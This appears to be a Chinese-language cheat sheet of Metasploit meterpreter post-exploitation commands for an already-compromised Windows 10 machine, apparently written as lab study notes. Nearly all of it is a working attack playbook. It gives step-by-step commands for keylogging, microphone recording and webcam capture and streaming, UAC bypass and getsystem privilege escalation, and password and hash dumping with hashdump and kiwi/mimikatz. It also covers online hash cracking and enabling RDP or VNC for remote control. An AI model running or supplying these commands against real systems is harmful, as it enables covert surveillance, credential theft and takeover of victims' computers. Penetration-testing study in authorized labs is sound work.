:::info
**前提:**
**已经渗透到某一台靶机上了**

:::
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673771848658-52f95476-6cd1-4d03-b7c1-6775545de963.png#averageHue=%23050404&clientId=u72ca8e9d-807f-4&from=paste&height=23&id=uc97188ae&originHeight=26&originWidth=571&originalType=binary&ratio=1&rotation=0&showTitle=false&size=948&status=done&style=none&taskId=u4d55e91c-fbe9-4d47-8b34-038eb0ec134&title=&width=507.55555555555554)
# 命令集
> 一下所有命令均在**meterpreter**下


## 访问文件系统
| help | 能够查看到所有的文件 |
| --- | --- |
| cat | 读取文件内容 |
| cd | 切换靶机目录 |
| lcd | 切换本地目录 |
| cp | 复制文件到目标 |
| mv | 移动到目标 |
| chmod | 修改文件权限 
例如:
chmod 777 文件名.后缀 |
| del  | 删除靶机文件 |
| rm | 删除靶机文件 |
| dir | 打印靶机目录 |

| lpwd | 打印本地目录 |
| --- | --- |
| pwd | 打印目标的目录 |
| search | 搜索文件. 

具体查看:
search -h |



## 上传下载文件
| upload | 传文件到靶机 |
| --- | --- |
| download | 从靶机下载文件 |


## 屏幕截图
| screenshot | 截图(Windows) |
| --- | --- |
|  |  |


## 键盘记录
| keyscan_start | 启动键盘记录 |
| --- | --- |
| keyscan_dump | 导出键盘(Windows) |
| keycan_stop | 停止键盘记录(Windows) |


## 查看, 创建账户和提权
> **靶机: win10 企业版 2015 长期服务**

**系统的权限 > 超级管理员的权限 > 普通用户的权限**

1. 查看目标已经存在的账户
```markdown
 run post/windows/gather/enum_logged_on_users
```

1. 创建账户(只有系统管理员才可以) 
```markdown
run getuid -u 用户名 -p 密码
```

2. 提权
```
getsystem
 
 #  在windows中 按住 win+R 输入: netplwiz 可以看到当前电脑上的用户有哪些
```

1. 无法提权
```
 bg
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673779508305-d1d156d5-99cb-4d14-a747-91aa850e5034.png#averageHue=%23130c0b&clientId=u72ca8e9d-807f-4&from=paste&id=udd2c5636&originHeight=81&originWidth=543&originalType=url&ratio=1&rotation=0&showTitle=false&size=8489&status=done&style=none&taskId=u9726b880-28ac-45c3-8286-bf646171f6d&title=)
```
# 查看那些参数需要配置
 options
```
```
# 配置session
 set session 刚才bg看到的session
```
```
 run
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673779508317-f9380fd0-20a9-4a04-aa55-ed28b30149cc.png#averageHue=%23090504&clientId=u72ca8e9d-807f-4&from=paste&id=u69145a27&originHeight=159&originWidth=678&originalType=url&ratio=1&rotation=0&showTitle=false&size=15582&status=done&style=none&taskId=u1c0e17f3-c00f-4c62-916d-ac3c867d8b2&title=)
之后在靶机上会弹出:
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673779508331-54a96ada-58a5-475b-bf0a-bc77d34532fd.png#averageHue=%23f4be28&clientId=u72ca8e9d-807f-4&from=paste&id=u1cfb8463&originHeight=353&originWidth=770&originalType=url&ratio=1&rotation=0&showTitle=false&size=70856&status=done&style=none&taskId=uc92338ed-9221-441d-9220-b2dbb47e491&title=)
点击**是**, 就可以了


## 调用靶机音频设备

 在meterpreter下, 输入:
```
help
```
![](https://cdn.jsdelivr.net/gh/wangyuhubugui/BJYH_picture@main/img/image-20230115190111245.png#id=fPXKO&originHeight=66&originWidth=460&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

查看帮助输入:
```
record_mic -h
```
```
    -d   默认录制1秒, 这里设置录制的时间
    -f   设置录制后文件的存储路径 (Default: '/home/kali/[randomname].wav')
    -h   查看帮助               Help Banner
    -p   自动播放, 默认是true   Automatically play the captured audio (Default: 'true')
```
![](https://cdn.jsdelivr.net/gh/wangyuhubugui/BJYH_picture@main/img/image-20230115190037482.png#id=V2j96&originHeight=236&originWidth=618&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

录制4秒视频
![](https://cdn.jsdelivr.net/gh/wangyuhubugui/BJYH_picture@main/img/image-20230115185936000.png#id=Cxi1W&originHeight=88&originWidth=555&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
> 到kali的指定的路径下, 就可以看到录制的文件了.



## 提权

### 方法一

```
getuid
```

```
getsystem
```

![](https://cdn.jsdelivr.net/gh/wangyuhubugui/BJYH_picture@main/img/image-20230115191827897.png#id=LuDQJ&originHeight=97&originWidth=745&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

> 成功啦!


### 方法二

1. 查看提权模块, 在msf 中输入:

```
 search bypassuac
```

![](https://cdn.jsdelivr.net/gh/wangyuhubugui/BJYH_picture@main/img/image-20230115193055345.png#id=hbeW6&originHeight=356&originWidth=737&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

2. 从上面的模块中选一个, 能用就行

```
use  exploit/windows/local/bypassuac_windows_store_reg  

# 或者use exploit/windows/local/bypassuac_sluihijack
# 或者use exploit/windows/local/bypassuac_dotnet_profiler
```

![](https://cdn.jsdelivr.net/gh/wangyuhubugui/BJYH_picture@main/img/image-20230115193515736.png#id=lLBDq&originHeight=45&originWidth=786&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

3. 接着输入:

```
show options
```

![](https://cdn.jsdelivr.net/gh/wangyuhubugui/BJYH_picture@main/img/image-20230115193549803.png#id=KrBgj&originHeight=251&originWidth=632&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

4. 查看session

```
sessions
```

![](https://cdn.jsdelivr.net/gh/wangyuhubugui/BJYH_picture@main/img/image-20230115193631844.png#id=Fzlkk&originHeight=257&originWidth=826&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

5. 配置session

```
set session 需要提权的session id
```

6. 输入:

```
run
```

![](https://cdn.jsdelivr.net/gh/wangyuhubugui/BJYH_picture@main/img/image-20230115193659003.png#id=bHQVU&originHeight=91&originWidth=747&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

> 此时, getuid , 看到的还不是 系统管理员, 我们需要一次输入:
>  

```
getuid

getsystem
```


## 拿到管理员账号和密码

> **注意: 一下所有的命令均在meterpreter下**


### 方法一: 拿自动登录的电脑的账号和密码
```
run windows/gather/credentials/windows_autologin
```
如果提示这证明本机并没有配置自动登录
![](https://cdn.jsdelivr.net/gh/wangyuhubugui/BJYH_picture@main/img/image-20230115200258326.png#id=ueg81&originHeight=83&originWidth=826&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

> **注意: 下面三种方法必须在系统管理员下(提权)**


### 方法二: 导出SAM数据库本地账户密码文件
```
run post/windows/gather/smart_hashdump

# 如果成功的话, 输入完成后就可以直接看到出现的站好和密码
```
| 用户名 | SID | LM哈希: | NTLM哈希1::: |
| --- | --- | --- | --- |
| 这里对着账户名字 | 1000 | aad3b435b51404eeaad3b435b51404ee | (这里对应的就是密码, 需要到cmd5解析) |

在线解析工具:  [https://www.cmd5.com/](https://www.cmd5.com/)

### 方法三: 导出密码哈希
```
run hashdump

# 如果成功的话, 输入完成后就可以直接看到出现的站好和密码
```
还是需要看NTLM.
在线解析工具:  [https://www.cmd5.com/](https://www.cmd5.com/)

### 方法四:使用kiwi模块获取
> kiwi_cmd 模块可以让我们使用mimikatz的全部功能， mimikatz 的命令直接在kiwi_cmd里直接使用


```
 load kiwi
```
```
直接获取密码, 输入:
creds_all

# 也可以用下面这个, 直接获取密码
kiwi_cmd sekurlsa::logonpasswords
```

## kiwi 命令
| kiwi参数和描述 |
| --- |
| creds_all               列举所有凭据 |
| creds_kerberos    列举所有kerberos凭据 |
| creds_msv            列举所有msv凭据 |
| creds_ssp             列举所有ssp凭据 |
| creds_tspkg        列举所有tspkg凭据 |
| creds_wdigest    列举所有wdigest凭据 |
| dcsync                通过DCSync检索用户帐户信息 |
| dcsync_ntlm      通过DCSync检索用户帐户NTLM散列、SID和RID |
| golden_ticket_create            创建黄金票据 |
| kerberos_ticket_list              列举kerberos票据 |
| kerberos_ticket_purge        清除kerberos票据 |
| kerberos_ticket_use             使用kerberos票据 |
| kiwi_cmd                               执行mimikatz的命令，后面接mimikatz.exe的命令 |
| lsa_dump_sam                    dump出lsa的SAM |
| lsa_dump_secrets               dump出lsa的密文 |
| password_change              修改密码 |
| wifi_list                                 列出当前用户的wifi配置文件 |
| wifi_list_shared                   列出共享wifi配置文件/编码 |


# 远程监控
:::info
**注意: 此时已经渗透进去了**
:::
# 安装rdesktop
**安装Debian,Ubuntu,kali下使用以下命令**
```
apt-get install rdesktop

```

---

Centos/RedHat可以通过yum命令
```
yum -y install rdesktop
```

## rdesktop简介
> rdesktop是linux下支持Windows远程桌面连接的客户端程序，在linux系统下可通过它远程访问Windows桌面，支持多种版本。rdesktop是sourceforge下支持GPL协议的一个开源项目，采用RDP（Remote Desktop Protocol,远程桌面协议），几乎可以连接windows的所有版本


## rdesktop的参数
| id | 参数 | 描述 |
| --- | --- | --- |
| 1 | -u | 账户名 |
| 2 | -p | 密码 |
| 3 | -a 16 | 指使用16位色显示远程画面 |
| 4 | -f | 全屏模式（用**Ctrl+Alt+Enter** 组合键退出全屏） |
| 5 | -g | 设置分辨率 如 :   -g 1024x768 |
| 6 | rdesktop -h | 查看rdesktop使用帮助 |

## 远控方法一:
在**root**下输入输入ip
```
rdesktop -u mb -p 123456 -f  -g 1024x720 被控制的ip
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673785857084-b65ce2e4-5b95-4b1f-92df-486c3da4622a.png#averageHue=%23272e3e&clientId=ub0de73ee-bab8-4&from=paste&height=34&id=uf758d516&originHeight=38&originWidth=547&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13397&status=done&style=none&taskId=ue509ae8d-27c1-40f2-9bb1-407b78489a3&title=&width=486.22222222222223)
如果对方的远控没有打开的话, 还需要提前开启远控,  输入:
```
run post/windows/manage/enable_rdp
```

## 远控方法二:
直接在kali的**meterpreter**中输入:
```
run vnc
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673785977967-2b94f1c2-5713-40ba-bd0d-66935e5b96ba.png#averageHue=%23110e0c&clientId=ub0de73ee-bab8-4&from=paste&height=28&id=u0b701aaa&originHeight=31&originWidth=196&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1089&status=done&style=none&taskId=ud7f3e9a3-1c10-4448-a161-beb830a1706&title=&width=174.22222222222223)


# 调用远程摄像头webcam
靶机获取到meterpreter后我们可以使用  webcam模块实现调用软，硬件摄像头

webcam模块支持命令

| id | 模块名 | 解释 |
| --- | --- | --- |
| 1 | **webcam_list** | 列出靶机中的所有软，硬件摄像头列表，并编号 |
| 2 | **webcam_snap** | 可调用单个软，硬件摄像头拍照，默认调用第一个摄像头 |
| 3 | **webcam_stream** | 可调用单个软，硬件摄像头直播，默认调用第一个摄像头 |

1. 直接输入:
```
webcam_list
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673789153565-3ad5373a-eea3-41d5-a204-890eda8ca7eb.png#averageHue=%2357676a&clientId=ue8c7403c-ae40-4&from=paste&height=41&id=u173c9ffc&originHeight=46&originWidth=612&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33220&status=done&style=none&taskId=uc1eae83c-8872-4474-b733-a4a41d2865e&title=&width=544)


2.  webcam_snap  调用单个软，硬件摄像头拍照
| id | 参数 | 描述 |
| --- | --- | --- |
| 1 | -h | 显示帮助 |
| 2 | -i | -i 1 “1”代表调用摄像头编号 |
| 3 | -p | -p  /root "root"设置存储路径 |
| 4 | -q | -q  100  "100" 表示存储图片的质量默认为 50 |
| 5 | -v | -v  false   -v 2个参数  true 和  false   这个参数表示拍照后自动打开,默认参数为true |

```
webcam_snap -i 1 -p po -q 100
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26140423/1673789248347-418ca973-967a-41a8-b9ff-c344523cbaf8.png#averageHue=%2341484c&clientId=ue8c7403c-ae40-4&from=paste&height=47&id=u36c39d8d&originHeight=53&originWidth=730&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49049&status=done&style=none&taskId=u2e96e056-7fac-4e71-8048-e868bc2e7de&title=&width=648.8888888888889)


3 webcam_stream  调用单个软，硬件摄像头直播

| id | 参数 | 描述 |
| --- | --- | --- |
| 1 | -h | 显示帮助 |
| 2 | -d | -d 100  "100"=100秒   设置流持续时间为100秒   默认为1800 |
| 3 | -i | -i 1 “1”代表调用摄像头编号 |
| 4 | -q | -q 100  “100”指流质量 默认为50 |
| 5 | -s | -s live “live”指流文件路径  默认输出在当前目录（注意目录不存在不会自动创建） |
| 7 | -f | -f live  “live”指播放文件的存储地址  默认输出在当前目录 |
| 8 | -v | -v  false   -v 2个参数  true 和  false   这个参数表示拍照后自动打开,默认参数为true |

> 示例: 略

